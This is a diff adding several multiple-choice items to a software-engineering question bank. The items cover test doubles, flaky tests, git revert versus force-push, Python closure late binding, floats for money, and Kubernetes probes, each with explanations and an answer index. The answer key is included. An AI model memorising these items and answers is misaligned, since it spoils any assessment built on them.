+        "A snapshot; it uses too much disk",
+        "A canary; it sends real payments"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Doubles keep unit tests fast and deterministic, but every mocked interaction is an assumption about the real dependency that the test never checks.",
+      "choiceNotesMd": [
+        "Fixtures set up test data or state; doubles stand in for collaborators.",
+        "Correct: useful in moderation, backed by a few real integration or contract tests.",
+        "Snapshot tests compare output against a saved copy.",
+        "Canaries are a deployment technique."
+      ],
+      "tags": [
+        "testing"
+      ],
+      "topicMd": "**Test doubles.**\n\n- **Stub**: returns canned answers (\"the payment API says OK\").\n- **Mock**: also checks how it was called (\"charge was called once with 4999\").\n- **Fake**: a working lightweight implementation (an in-memory repository).\n- **Spy**: wraps the real thing and records calls.\n\nGuidelines:\n\n- Mock at your system's **boundaries** (network, clock, randomness, payments), not every internal class.\n- Prefer fakes and real lightweight dependencies (SQLite or Testcontainers) where practical.\n- Assert on outcomes rather than exact call sequences, so refactoring doesn't break tests.\n\n---\n\nTo keep the assumptions honest, add a few integration tests against a real or sandbox service, or **contract tests** (e.g. Pact), which check that both sides agree on the API.",
+      "keyTerms": [
+        {
+          "term": "Test double",
+          "def": "Any stand-in for a real dependency in a test."
+        },
+        {
+          "term": "Stub",
+          "def": "A double returning canned responses."
+        },
+        {
+          "term": "Mock",
+          "def": "A double that also verifies the calls it receives."
+        },
+        {
+          "term": "Contract test",
+          "def": "Checks that a provider and its consumers agree on an API."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-36",
+      "promptMd": "A test passes on your machine but fails about 1 run in 20 in CI, with no code changes. Which is the **least** likely cause?",
+      "choices": [
+        "It depends on timing, such as `sleep(100)` and hoping work has finished",
+        "It shares state with other tests (a database row or global variable), and test order varies",
+        "It uses the current date or time, or random data without a fixed seed",
+        "The assertion compares two constants that never change"
+      ],
+      "answerIndex": 3,
+      "explanationMd": "Comparing fixed constants is deterministic. Flakiness comes from hidden inputs: time, ordering, concurrency, randomness, the network or shared state.",
+      "choiceNotesMd": [
+        "Timing assumptions are the most common cause; CI machines are slower and busier.",
+        "Order-dependent tests fail when they run in parallel or shuffled.",
+        "Dates (end of month, time zones, DST) and unseeded randomness make results vary.",
+        "Correct: this one can't flake. It's the only option with no hidden input."
+      ],
+      "tags": [
+        "testing"
+      ],
+      "topicMd": "**Flaky tests** pass and fail without code changes, which teaches people to ignore red builds. The usual causes, and fixes:\n\n- **Timing**: fixed sleeps, races with background work. Wait for a condition with a timeout instead, or make the work synchronous in tests.\n- **Shared state**: tests that depend on order or leave data behind. Isolate each test (transactions rolled back, fresh fixtures, unique ids).\n- **Time and randomness**: inject a fake clock, and fix seeds (log the seed when it's random).\n- **External services**: the network, rate limits, third-party sandboxes. Use doubles, or run against local containers.\n- **Resources**: fixed ports or temp paths shared between parallel runs.\n\n---\n\nProcess: track flaky tests, quarantine one only with an owner and a deadline, and fix the root cause. Blind automatic retries hide real concurrency bugs, which sometimes are bugs in the product, not the test.",
+      "keyTerms": [
+        {
+          "term": "Flaky test",
+          "def": "Passes or fails without any code change."
+        },
+        {
+          "term": "Test isolation",
+          "def": "Each test sets up and cleans up its own state."
+        },
+        {
+          "term": "Fake clock",
+          "def": "Controllable time source used in tests."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-37",
+      "promptMd": "A bad commit has already been pushed to `main`, and teammates have pulled it. What's the safe way to undo it?",
+      "choices": [
+        "`git reset --hard HEAD~1` followed by `git push --force`",
+        "`git revert <commit>`: a new commit that undoes the change, without rewriting shared history",
+        "Delete the branch and recreate it",
+        "Edit the files back by hand and amend the bad commit"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Revert adds history instead of rewriting it, so everyone's clones stay consistent and the undo itself is recorded and reviewable.",
+      "choiceNotesMd": [
+        "Rewriting a shared branch breaks teammates' clones and can silently drop their work.",
+        "Correct: revert is the history-preserving undo for shared branches.",
+        "That rewrites shared history even more drastically.",
+        "Amending also rewrites the pushed commit."
+      ],
+      "tags": [
+        "git"
+      ],
+      "topicMd": "**Undoing things in git.**\n\n- `git revert <sha>`: new commit with the inverse change. Safe on shared branches. (Reverting a merge commit needs `-m 1` to pick the mainline.)\n- `git reset --soft|--mixed|--hard <ref>`: moves the branch pointer, rewriting history. Fine for local, unpushed work.\n- `git restore <file>`: discard changes in the working tree; `git restore --staged <file>` unstages.\n- `git commit --amend`: replace the last commit. Only before pushing.\n- `git reflog`: the safety net. It lists where HEAD has been, so \"lost\" commits can be recovered after a bad reset.\n\n---\n\nRule of thumb: never rewrite history others have pulled. If you really must (say, to purge a secret), coordinate with the team and use `--force-with-lease`, which refuses to overwrite commits you haven't seen.",
+      "keyTerms": [
+        {
+          "term": "git revert",
+          "def": "Creates a new commit that undoes an earlier one."
+        },
+        {
+          "term": "git reset",
+          "def": "Moves a branch pointer, optionally changing files."
+        },
+        {
+          "term": "git reflog",
+          "def": "Log of where HEAD and branches have pointed."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-38",
+      "promptMd": "What does this Python print?\n\n```python\nfuncs = [lambda: i for i in range(3)]\nprint([f() for f in funcs])\n```",
+      "choices": [
+        "[0, 1, 2]",
+        "[2, 2, 2]",
+        "[0, 0, 0]",
+        "It raises NameError"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Closures capture the **variable** `i`, not its value at creation time. By the time the lambdas run, the loop has finished and `i` is 2 for all of them.",
+      "choiceNotesMd": [
+        "That needs each lambda to capture the value, e.g. `lambda i=i: i`.",
+        "Correct: late binding, so all three see the final value of `i`.",
+        "`i` ends at 2, not 0.",
+        "The comprehension's `i` stays alive in the closures' scope, so there's no error."
+      ],
+      "tags": [
+        "python",
+        "language gotchas"
+      ],
+      "topicMd": "**Late-binding closures.** A Python closure looks up free variables when it **runs**, not when it's created. All the lambdas share the one `i` of the comprehension's scope, which ends at 2.\n\nFixes:\n\n```python\nfuncs = [lambda i=i: i for i in range(3)]          # default argument binds now\nfuncs = [functools.partial(lambda x: x, i) for i in range(3)]\n```\n\n---\n\nOther languages:\n\n- **JavaScript**: `for (var i …)` has the same problem (one shared `i`), while `let` creates a fresh binding per iteration.\n- **Java**: lambdas may only capture effectively final variables, so a classic `for (int i = 0; …; i++)` counter can't be captured at all (copy it into a local first); an enhanced `for (int x : xs)` variable is fresh each iteration and can be.\n- **C++**: you choose explicitly: `[i]` captures by value (a snapshot), `[&i]` by reference (late binding, and dangerous if `i` dies).\n- **Go**: before Go 1.22, loop variables were shared across iterations, causing exactly this bug with goroutines.",
+      "keyTerms": [
+        {
+          "term": "Closure",
+          "def": "A function that captures variables from its surrounding scope."
+        },
+        {
+          "term": "Late binding",
+          "def": "The variable's value is looked up when the function runs."
+        },
+        {
+          "term": "Default-argument trick",
+          "def": "lambda i=i: binds the current value at creation time."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-39",
+      "promptMd": "An online shop stores prices as floating-point numbers and adds them up. What's the problem, and what's the usual fix?",
+      "choices": [
+        "Floats are too slow for arithmetic",
+        "Binary floats can't represent most decimal fractions exactly (0.1 + 0.2 ≠ 0.3), so totals drift by fractions of a cent. Store integer cents, or use a decimal type.",
+        "Floats can't hold numbers above 1,000",
+        "Floats are fine for money as long as you round when displaying"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "0.10 is stored as an approximation in binary, and the errors accumulate over many operations. Integers of the smallest unit (cents) or decimal types keep exact values.",
+      "choiceNotesMd": [
+        "Speed isn't the issue; exactness is.",
+        "Correct: use integer minor units (cents) or a decimal type, with explicit rounding rules.",
+        "Doubles hold values up to about 10³⁰⁸; range isn't the problem.",
+        "Display rounding hides the error, but totals, comparisons and tax calculations can still come out a cent off."
+      ],
+      "tags": [
+        "language gotchas",
+        "floating point"
+      ],
+      "topicMd": "**Money and floating point.** IEEE-754 doubles store binary fractions, so decimal amounts like 0.10 are approximations. Each operation can add a tiny error; sums of many items, equality checks (`total == 30.00`) and rounding can then be off by a cent, which matters for invoices and accounting.\n\nOptions:\n\n- **Integer minor units**: store 1999 (cents) instead of 19.99, and use 64-bit integers.\n- **Decimal types**: Python `decimal.Decimal`, Java `BigDecimal` (construct from strings, not doubles), SQL `NUMERIC(12, 2)`.\n- Define **rounding rules** explicitly (half-up or banker's rounding) and apply them at defined steps, such as per line item vs. per invoice.\n\n---\n\nAlso remember: keep the currency with the amount, since currencies have different numbers of decimal places (JPY has 0, KWD has 3). Floats are fine for measurements and science, where tiny relative errors are acceptable.",
+      "keyTerms": [
+        {
+          "term": "IEEE-754",
+          "def": "Standard for binary floating-point numbers."
+        },
+        {
+          "term": "Minor unit",
+          "def": "The smallest currency unit, such as cents."
+        },
+        {
+          "term": "BigDecimal",
+          "def": "Java's arbitrary-precision decimal type."
+        }
+      ]
+    },
+    {
+      "id": "bank-swe-40",
+      "promptMd": "In Kubernetes, what's the difference between a **readiness** probe and a **liveness** probe?",
+      "choices": [
+        "They're two names for the same check",
+        "Failing readiness takes the pod out of the load balancer (it receives no traffic); failing liveness makes Kubernetes restart the container",
+        "Readiness runs once at startup, and liveness never runs",
+        "Liveness checks the network; readiness checks the disk"
+      ],
+      "answerIndex": 1,
+      "explanationMd": "Readiness says \"don't send me traffic right now\" (warming up, overloaded, dependency down). Liveness says \"I'm stuck; restart me\".",
+      "choiceNotesMd": [
+        "They trigger different actions, so mixing them up causes outages.",
+        "Correct: readiness controls traffic, liveness controls restarts.",
+        "Both run periodically. A separate startup probe covers slow starts.",
+        "Each probe can check whatever you configure; the difference is what happens when it fails."
+      ],
+      "tags": [
+        "devops",
+        "reliability"
+      ],
+      "topicMd": "**Kubernetes probes.**\n\n- **Readiness**: while failing, the pod is removed from Service endpoints, so it gets no traffic but keeps running. Use it for warm-up, draining during shutdown, or temporary overload.\n- **Liveness**: after repeated failures, the container is killed and restarted. Use it only for states the process can't recover from by itself (deadlock, a wedged event loop).\n- **Startup**: holds off the other probes until a slow-starting app is up.\n\n---\n\nA common outage pattern: a liveness probe that checks a shared dependency (the database). When the database blips, every pod fails liveness and restarts at once, turning a short blip into a full outage. Keep liveness checks local and cheap (\"can this process respond?\"), and put dependency checks, if anywhere, in readiness. Also set graceful shutdown: on SIGTERM, fail readiness, finish in-flight requests, then exit.",
+      "keyTerms": [
+        {
+          "term": "Readiness probe",
+          "def": "Decides whether a pod should receive traffic."
+        },
+        {
+          "term": "Liveness probe",
+          "def": "Decides whether a container should be restarted."
+        },
+        {
+          "term": "Graceful shutdown",
+          "def": "Stop taking new work, finish current work, then exit."
+        }
+      ]
+    }
+  ]
+}
